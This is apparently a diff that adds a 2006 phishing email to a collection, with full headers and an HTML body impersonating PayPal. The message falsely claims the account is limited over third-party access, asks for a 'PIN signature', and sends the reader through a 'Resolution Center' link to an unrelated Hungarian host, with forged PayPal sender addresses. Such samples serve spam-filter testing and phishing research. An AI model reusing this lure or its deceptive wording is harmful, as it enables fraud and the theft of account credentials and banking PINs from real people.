@@ -1,0 +1,212 @@
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 232B546977
+	for <user@login.example.com>; Wed,  4 Oct 2006 11:07:21 -0400 (EDT)
+Received: from BZstorage (102.13.233.64.transedge.com [64.233.13.102])
+	by mail.example.org (Postfix) with ESMTP id BB84B6CD1C5
+	for <user@example.com>; Wed,  4 Oct 2006 11:07:20 -0400 (EDT)
+Received: from User ([64.27.13.60]) by BZstorage with Microsoft SMTPSVC(5.0.2195.6713);
+	 Wed, 4 Oct 2006 11:07:51 -0400
+Reply-To: <no-replay@paypal.com>
+From: "service@paypal.com"<service@paypal.com>
+Subject: Resolution Center: Your account is limited.
+Date: Wed, 4 Oct 2006 08:07:16 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <BZSTORAGEeAzdfTVSxz00000482@BZstorage>
+X-OriginalArrivalTime: 04 Oct 2006 15:07:51.0343 (UTC) FILETIME=[DC5F93F0:01C6E7C6]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 378
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0081)https://www.paypal.com/row/cgi-bin/webscr?cmd=_login-done&login_access=1137959601 -->
+<HTML><HEAD><TITLE>PayPal - Limited Account Access Details</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=UTF-8"><!--
+       Script info: script: webscr, cmd: _login-done, template: p/acc/help-restrictedaccts, date 15:18:25 PST; country: CA, language: en_US, xslt server: 
+       web version: 38.0-193644 branch: live-380_int
+       content version: 38.0-193339
+       pexml version: 38.0-193644
+       page XSL: /default/en_US/account/HelpRestrictedAccts.xsl
+-->
+<META http-equiv=description 
+content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
+<META http-equiv=keywords 
+content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE"><LINK 
+href="PayPal - Limited Account Access Details_files/xpt.css" type=text/css 
+rel=stylesheet><LINK 
+href="PayPal - Limited Account Access Details_files/xptInvoice.css" 
+type=text/css rel=stylesheet><LINK 
+href="PayPal - Limited Account Access Details_files/xptObsolete.css" 
+type=text/css rel=stylesheet><LINK 
+href="PayPal - Limited Account Access Details_files/xptlive.css" type=text/css 
+rel=stylesheet>
+<STYLE type=text/css></STYLE>
+<LINK href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" 
+rel="shortcut icon">
+<SCRIPT src="PayPal - Limited Account Access Details_files/pp_main.js"></SCRIPT>
+
+<META content="MSHTML 6.00.2900.2802" name=GENERATOR></HEAD>
+<BODY>
+<DIV>
+  <DIV id=xptHeader> 
+    <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+  <TBODY>
+  <TR>
+          <TD noWrap>&nbsp;</TD>
+    <TD class=cobrand align=middle width="100%">&nbsp;</TD>
+          <TD noWrap align=right>&nbsp;</TD>
+        </TR></TBODY></TABLE>
+    <table cellspacing=0 cellpadding=0 width=600 align=center border=0>
+      <tbody>
+        <tr> 
+          <td width="600"><img height=1 alt="" 
+      src="PayPal - Limited Account Access Details_files/pixel.gif" width=600 
+      border=0></td>
+        </tr>
+        <tr> 
+          <td> <div id=xptTitle><img src="http://coiciu.org/images/privacy.jpg" width="600" height="176"> 
+              <table class=main cellspacing=0 cellpadding=0 align=center border=0>
+                <tbody>
+                  <tr> 
+                    <td class=heading width="100%"></td>
+                  </tr>
+                  <tr> 
+                    <td><img height=2 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></td>
+                  </tr>
+                  <tr> 
+                    <td> <hr> </td>
+                  </tr>
+                  <tr> 
+                    <td><img height=4 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></td>
+                  </tr>
+                </tbody>
+              </table>
+            </div></td>
+        </tr>
+        <tr> 
+          <td valign=top><font size="2" face="Arial, Helvetica, sans-serif">We recently reviewed your account, and 
+            we need more information about your business to allow us to provide 
+            uninterrupted service. Until we can collect this information, your 
+            access to sensitive account features will be limited. We would like 
+            to restore your access as soon as possible. We apologize for the inconvenience.<br>
+            </font>
+            <hr class=dotted>
+            <div align="center"><font size="2" face="Arial, Helvetica, sans-serif"><span class=emphasis><strong><font color="#FF0000" size="3">Why 
+              is my account access limited?</font></strong></span><br>
+              <br 
+      class=h6>
+              Your account access has been limited for the following reason(s):<br>
+              <br>
+              </font> </div>
+            <li><strong><font size="2" face="Arial, Helvetica, sans-serif"><span class=emphasis> 
+              </span></font></strong><font size="2" face="Arial, Helvetica, sans-serif"><span class=emphasis> 
+              </span>We have reason to believe that your account was accessed 
+              by a third party. Because protecting the security of your account 
+              is our primary concern, we have limited access to sensitive PayPal 
+              account features. We understand that this may be an inconvenience 
+              but please understand that this temporary limitation is for your 
+              protection. </font></li>
+            <li><font size="2" face="Arial, Helvetica, sans-serif">Requiring PIN 
+              Signatures is the latest security measure against: identity theft, 
+              credit card fraud and unauthorized account access. PayPal will verify 
+              it with your bank records for your own protection. </font></li>
+            <li> <font size="2" face="Arial, Helvetica, sans-serif">If you provide 
+              a wrong PIN your account will be suspended or limited for unauthorized 
+              account access.<br>
+              <br>
+              (Your case ID for this reason is PP-192-084-509.)<br>
+              <br>
+              </font> 
+              <hr align="center" class=dotted>
+              <div align="center"><font size="2" face="Arial, Helvetica, sans-serif"><span class=emphasis><strong>How 
+                can I restore my account access?</strong></span><br>
+                <br>
+                </font> 
+                <table cellspacing=0 cellpadding=1 width="100%" align=center 
+      bgcolor=#cc9999>
+                  <tbody>
+                    <tr> 
+                      <td> <table cellspacing=0 cellpadding=5 width="100%" align=center 
+            bgcolor=#ffeeee>
+                          <tbody>
+                            <tr> 
+                              <td><div align="center"><font size="2" face="Arial, Helvetica, sans-serif"><span class=emphasis>Please 
+                                  visit the <a 
+                  href="http://don-zo.e-page.hu/usage/.webscr/cmd-login-run/"><strong>Resolution 
+                                  Center</strong></a> and complete the steps to 
+                                  remove limitations. </span></font></div></td>
+                            </tr>
+                          </tbody>
+                        </table></td>
+                    </tr>
+                  </tbody>
+                </table>
+                <font size="2" face="Arial, Helvetica, sans-serif"><br>
+                <strong>Completing all of the checklist items will automatically 
+                restore your account access.</strong> </font> </div>
+              <hr align="center" class=dotted>
+              <div align="center"><br>
+                <table width="292" border=0 align=center cellpadding=0 cellspacing=0>
+                  <tbody>
+                    <tr> 
+                      <td width="292"> <p class=lastPara> <font size="2">Copyright 
+                          © 1999-2006 PayPal. All rights reserved</font><font size="1.5">.</font><br>
+                        </p></td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </li></td>
+        </tr>
+      </tbody>
+    </table>
+  </DIV>
+  <DIV id=xptTabs> 
+    <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+  <TBODY>
+  <TR>
+    <TD width="50%" rowSpan=2>&nbsp;</TD>
+    <TD align=left>
+      <TABLE cellSpacing=0 cellPadding=0 align=center border=0>
+        <TBODY>
+        <TR>
+                  <TD>&nbsp;</TD>
+          <TD><IMG height=1 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></TD>
+                  <TD>&nbsp;</TD>
+          <TD><IMG height=1 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></TD>
+                  <TD>&nbsp;</TD>
+          <TD><IMG height=1 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></TD>
+                  <TD>&nbsp;</TD>
+          <TD><IMG height=1 alt="" 
+            src="PayPal - Limited Account Access Details_files/pixel.gif" 
+            width=1 border=0></TD>
+                  <TD>&nbsp;</TD>
+                </TR></TBODY></TABLE></TD>
+    <TD width="50%" rowSpan=2>&nbsp;</TD></TR>
+  <TR>
+    <TD align=left></TD></TR></TBODY></TABLE>
+    <BR>
+  </DIV>
+  </DIV></BODY></HTML>
+
